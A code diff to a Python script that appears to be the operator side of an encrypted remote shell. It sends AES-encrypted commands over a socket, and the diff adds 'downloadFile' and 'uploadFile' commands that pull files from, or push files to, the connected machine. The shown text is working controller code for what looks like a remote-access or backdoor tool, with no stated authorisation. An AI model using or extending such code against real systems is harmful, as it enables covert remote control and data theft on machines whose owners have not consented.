@@ -1,6 +1,6 @@
-import socket
+import socket, os
 import pyAesCrypt
-import io
+import io, time
 
 # socket configuration
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,6 +37,19 @@ def decryptData(msg):
 	decrypted = str(fDec.getvalue().decode())
 	return decrypted
 
+def sendFile(sock, file):
+	try:
+		with open(file, 'rb') as f:
+			fileData = f.read()
+			# Begin sending file
+			sock.sendall(fileData)
+			time.sleep(1)
+			sock.sendall('EOFX'.encode())
+		f.close()
+		return '> Upload: ' + file + ' complete.'
+	except:
+		return '> Error sending file: ' + file + '.'
+
 while True:
 	# receive the data 
 	data = s.recv(1024)
@@ -53,6 +66,28 @@ while True:
 			print('\nProcess end, thankyou!')
 			s.send(encryptData(nextcmd))
 			break
+		elif nextcmd[:12] == 'downloadFile':
+			s.send(encryptData(nextcmd))
+			g = open(nextcmd[12:], 'wb') 
+			while True:
+				l = s.recv(1024)
+				try:
+					if l.decode() == 'EOFX': break
+				except: pass
+				g.write(l)
+			g.close()
+		elif nextcmd[:10] == 'uploadFile':
+			try:
+				if os.path.isfile(str(nextcmd[11:])):
+					s.send(encryptData(nextcmd))
+					filemsg = sendFile(s, str(nextcmd[11:]))
+					print(filemsg)
+				else: 
+					s.send(encryptData('cd .'))
+					print('> Error locating this file.')
+			except:
+				s.send(encryptData('cd .'))
+				print('> Error: file not found.')
 		else: s.send(encryptData(nextcmd))	
 	# we haven't reached EOF, print
 	else:
